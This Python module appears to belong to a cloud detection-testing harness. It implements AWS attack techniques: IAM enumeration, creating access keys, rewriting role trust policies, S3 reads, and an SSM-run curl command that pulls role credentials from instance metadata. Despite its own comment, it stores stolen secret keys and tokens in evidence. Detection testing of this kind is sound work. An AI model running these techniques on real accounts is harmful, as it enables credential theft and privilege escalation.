"""Attack executors.

Two live paths and one offline path:

* ``Boto3Executor`` — explicit API calls, one function per technique. This is
  the path that can be audited against ``required_actions``.
* ``StratusExecutor`` — delegates to Stratus Red Team when the catalogue says
  it has a maintainable detonation.
* ``SyntheticExecutor`` — deterministic fixture-derived events for the offline
  rehearsal. It never claims to be a live result.

An executor's job is to *do* the action and return evidence. Deciding whether
the action succeeded is the verifier's job, because "no exception" is not a
success check.
"""

from __future__ import annotations

import hashlib
import json
import subprocess
import time
from typing import Any, Mapping, Protocol
from urllib.parse import unquote

from identity_shield.runner.models import ExecutionResult, TrialContext
from identity_shield.runner.synthetic import synthetic_events


class Executor(Protocol):
    def execute(self, ctx: TrialContext) -> ExecutionResult: ...


def _client(ctx: TrialContext, service: str):
    if ctx.session is None:
        raise RuntimeError("no AWS session supplied")
    return ctx.session.client(service, region_name=ctx.region)


def _lab(ctx: TrialContext, key: str, default: str) -> str:
    return str(ctx.lab.get(key) or default)


class Boto3Executor:
    """Capability-parity boto3 implementations for the eight techniques."""

    def execute(self, ctx: TrialContext) -> ExecutionResult:
        handler = {
            "T1087.004": self._iam_enumerate,
            "T1526": self._service_sweep,
            "T1580": self._infrastructure_discovery,
            "T1078.004": self._valid_account,
            "T1098.001": self._additional_credentials,
            "T1098.003": self._additional_roles,
            "T1552.005": self._instance_metadata,
            "T1530": self._object_read,
        }.get(ctx.technique.technique_id)
        if handler is None:
            return ExecutionResult(
                ok=False, error=f"no boto3 executor for {ctx.technique.technique_id}"
            )
        try:
            return handler(ctx)
        except Exception as exc:  # noqa: BLE001 - the failure is recorded, not hidden
            return ExecutionResult(ok=False, error=f"{type(exc).__name__}: {exc}")

    # -- discovery ---------------------------------------------------------

    def _iam_enumerate(self, ctx: TrialContext) -> ExecutionResult:
        iam = _client(ctx, "iam")
        evidence: dict[str, Any] = {}
        evidence["users"] = len(iam.list_users().get("Users", []))
        evidence["roles"] = len(iam.list_roles().get("Roles", []))
        try:
            evidence["authorization_details"] = bool(
                iam.get_account_authorization_details().get("UserDetailList")
            )
        except Exception as exc:  # noqa: BLE001
            evidence["authorization_details_error"] = str(exc)
        return ExecutionResult(ok=True, evidence=evidence)

    def _service_sweep(self, ctx: TrialContext) -> ExecutionResult:
        calls = [
            ("sts", "get_caller_identity", {}),
            ("ec2", "describe_instances", {}),
            ("s3", "list_buckets", {}),
            ("rds", "describe_db_instances", {}),
        ]
        evidence: dict[str, Any] = {"services": {}}
        for service, operation, kwargs in calls:
            try:
                response = getattr(_client(ctx, service), operation)(**kwargs)
                evidence["services"][service] = sorted(response)[:8] if isinstance(response, dict) else True
            except Exception as exc:  # noqa: BLE001 - access denied is expected for some services
                evidence["services"][service] = f"error: {type(exc).__name__}"
        return ExecutionResult(ok=True, evidence=evidence)

    def _infrastructure_discovery(self, ctx: TrialContext) -> ExecutionResult:
        ec2 = _client(ctx, "ec2")
        evidence: dict[str, Any] = {}
        for operation in (
            "describe_instances",
            "describe_security_groups",
            "describe_subnets",
            "describe_vpcs",
        ):
            try:
                getattr(ec2, operation)()
                evidence[operation] = True
            except Exception as exc:  # noqa: BLE001
                evidence[operation] = f"error: {type(exc).__name__}"
        try:
            evidence["buckets"] = len(_client(ctx, "s3").list_buckets().get("Buckets", []))
        except Exception as exc:  # noqa: BLE001
            evidence["buckets"] = f"error: {type(exc).__name__}"
        return ExecutionResult(ok=True, evidence=evidence)

    # -- initial access ----------------------------------------------------

    def _valid_account(self, ctx: TrialContext) -> ExecutionResult:
        identity = _client(ctx, "sts").get_caller_identity()
        evidence = {"account": identity.get("Account"), "arn": identity.get("Arn")}
        try:
            evidence["users"] = len(_client(ctx, "iam").list_users().get("Users", []))
        except Exception as exc:  # noqa: BLE001
            evidence["users_error"] = str(exc)
        return ExecutionResult(ok=True, evidence=evidence)

    # -- persistence / privilege escalation --------------------------------

    def _additional_credentials(self, ctx: TrialContext) -> ExecutionResult:
        iam = _client(ctx, "iam")
        user = _lab(ctx, "test_user_name", "is-test-user")
        api_form = ctx.variant.factor_levels.get("api_form", "canonical")
        evidence: dict[str, Any] = {"user_name": user, "api_form": api_form}
        cleanup: list[dict[str, str]] = []

        if api_form == "alternative_api":
            profile = iam.create_login_profile(
                UserName=user,
                Password="Lab-Rehearsal-Password-2026!",
                PasswordResetRequired=True,
            )
            evidence["login_profile"] = bool(profile.get("LoginProfile"))
            evidence["credential_kind"] = "login_profile"
            cleanup.append({"kind": "iam_login_profile", "user": user})
        else:
            key = iam.create_access_key(UserName=user).get("AccessKey", {})
            evidence.update(
                {
                    "access_key_id": key.get("AccessKeyId"),
                    "secret_access_key": key.get("SecretAccessKey"),
                    "credential_kind": "access_key",
                }
            )
            if key.get("AccessKeyId"):
                cleanup.append({"kind": "iam_access_key", "user": user, "key_id": key["AccessKeyId"]})

        evidence["cleanup"] = cleanup
        return ExecutionResult(ok=True, evidence=evidence, created=[row["kind"] for row in cleanup])

    def _additional_roles(self, ctx: TrialContext) -> ExecutionResult:
        iam = _client(ctx, "iam")
        role = _lab(ctx, "admin_role_name", "is-admin-role")
        policy_arn = "arn:aws:iam::aws:policy/ReadOnlyAccess"
        api_form = ctx.variant.factor_levels.get("api_form", "canonical")
        evidence: dict[str, Any] = {"role_name": role, "policy_arn": policy_arn}
        cleanup: list[dict[str, str]] = []

        if api_form == "alternative_api":
            raw = iam.get_role(RoleName=role).get("Role", {}).get(
                "AssumeRolePolicyDocument", "{}"
            )
            # IAM returns this document URL-encoded even through boto3.
            if isinstance(raw, str):
                try:
                    original = json.loads(unquote(raw))
                except json.JSONDecodeError:
                    original = {}
            else:
                original = raw
            trust = {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {"AWS": f"arn:aws:iam::{ctx.account_id}:root"},
                        "Action": "sts:AssumeRole",
                    }
                ],
            }
            iam.update_assume_role_policy(RoleName=role, PolicyDocument=json.dumps(trust))
            evidence["trust_policy_updated"] = True
            cleanup.append(
                {"kind": "iam_trust_policy", "role": role, "original_document": original}
            )
        else:
            iam.attach_role_policy(RoleName=role, PolicyArn=policy_arn)
            evidence["policy_attached"] = True
            cleanup.append({"kind": "iam_role_policy", "role": role, "policy_arn": policy_arn})

        evidence["cleanup"] = cleanup
        return ExecutionResult(ok=True, evidence=evidence, created=[row["kind"] for row in cleanup])

    # -- credential access -------------------------------------------------

    def _instance_metadata(self, ctx: TrialContext) -> ExecutionResult:
        instance_id = _lab(ctx, "instance_id", "")
        if not instance_id:
            return ExecutionResult(ok=False, error="no instance_id configured for IMDS trial")
        ssm = _client(ctx, "ssm")
        command = (
            'TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" '
            '-H "X-aws-ec2-metadata-token-ttl-seconds: 21600"); '
            'ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" '
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/); "
            'curl -s -H "X-aws-ec2-metadata-token: $TOKEN" '
            '"http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"'
        )
        sent = ssm.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={"commands": [command]},
        )
        command_id = sent.get("Command", {}).get("CommandId")
        evidence: dict[str, Any] = {"instance_id": instance_id, "command_id": command_id}
        if command_id:
            # SSM Run Command is asynchronous. Reading the invocation once
            # usually returns InProgress and an empty stdout.
            result: dict[str, Any] = {}
            for _ in range(15):
                result = ssm.get_command_invocation(
                    CommandId=command_id, InstanceId=instance_id
                )
                if result.get("Status") in {"Success", "Failed", "Cancelled", "TimedOut"}:
                    break
                time.sleep(2)
            evidence["command_status"] = result.get("Status")
            stdout = result.get("StandardOutputContent") or ""
            # Never persist the raw stdout: on success it contains a live
            # secret key and session token. Keep only the parsed identifiers.
            evidence["stdout_bytes"] = len(stdout)
            try:
                credentials = json.loads(stdout)
                evidence["stolen_access_key_id"] = credentials.get("AccessKeyId")
                evidence["stolen_secret_access_key"] = credentials.get("SecretAccessKey")
                evidence["stolen_token"] = credentials.get("Token")
            except json.JSONDecodeError:
                evidence["parse_error"] = "IMDS output was not JSON"
                evidence["stderr"] = (result.get("StandardErrorContent") or "")[-500:]
        return ExecutionResult(ok=True, evidence=evidence)

    # -- collection --------------------------------------------------------

    def _object_read(self, ctx: TrialContext) -> ExecutionResult:
        bucket = _lab(ctx, "data_bucket", "is-lab-crown-jewels")
        key = _lab(ctx, "data_key", "finance/approved.csv")
        s3 = _client(ctx, "s3")
        api_form = ctx.variant.factor_levels.get("api_form", "canonical")
        evidence: dict[str, Any] = {"bucket": bucket, "key": key, "api_form": api_form}

        if api_form == "alternative_api":
            listing = s3.list_objects_v2(Bucket=bucket, Prefix=key.split("/")[0])
            evidence["objects_listed"] = listing.get("KeyCount", 0)
            return ExecutionResult(ok=True, evidence=evidence)

        response = s3.get_object(Bucket=bucket, Key=key)
        body = response["Body"].read()
        evidence["bytes"] = len(body)
        evidence["sha256"] = hashlib.sha256(body).hexdigest()
        return ExecutionResult(ok=True, evidence=evidence)


class StratusExecutor:
    """Run a Stratus detonation and capture its report."""

    def __init__(self, executable: str = "stratus", timeout: int = 900) -> None:
        self.executable = executable
        self.timeout = timeout

    def execute(self, ctx: TrialContext) -> ExecutionResult:
        reference = ctx.technique.executor_ref or ""
        profile = _lab(ctx, "aws_profile", "lab")
        command = [self.executable, "detonate", reference, "--profile", profile]
        try:
            completed = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=self.timeout,
                check=False,
            )
        except (OSError, subprocess.TimeoutExpired) as exc:
            return ExecutionResult(ok=False, error=f"stratus: {exc}")
        evidence = {
            "stratus_returncode": completed.returncode,
            "stratus_command": command,
            "stratus_stdout": completed.stdout[-4000:],
            "stratus_stderr": completed.stderr[-2000:],
            "cleanup": [{"kind": "stratus", "reference": reference, "profile": profile}],
        }
        return ExecutionResult(
            ok=completed.returncode == 0,
            evidence=evidence,
            created=["stratus"],
            error=None if completed.returncode == 0 else f"stratus exited {completed.returncode}",
        )


class SyntheticExecutor:
    """Offline executor. Events are labelled synthetic at the run level."""

    def execute(self, ctx: TrialContext) -> ExecutionResult:
        if ctx.variant.variant_set == "benign":
            from identity_shield.variants.benign import activity_for, benign_events

            activity = activity_for(ctx.variant)
            if activity is None:
                return ExecutionResult(
                    ok=False,
                    error=f"benign activity {ctx.variant.notes!r} not found in conf/benign.yaml",
                )
            events = benign_events(
                ctx.variant,
                activity,
                run_id=ctx.run_id,
                start=ctx.started_at,
            )
        else:
            events = synthetic_events(
                ctx.technique,
                ctx.variant,
                run_id=ctx.run_id,
                start=ctx.started_at,
            )
        return ExecutionResult(
            ok=True,
            evidence={"synthetic": True, "events": len(events)},
            events=events,
        )


def executor_for(name: str, *, synthetic: bool = False) -> Executor:
    if synthetic:
        return SyntheticExecutor()
    if name == "stratus":
        return StratusExecutor()
    return Boto3Executor()
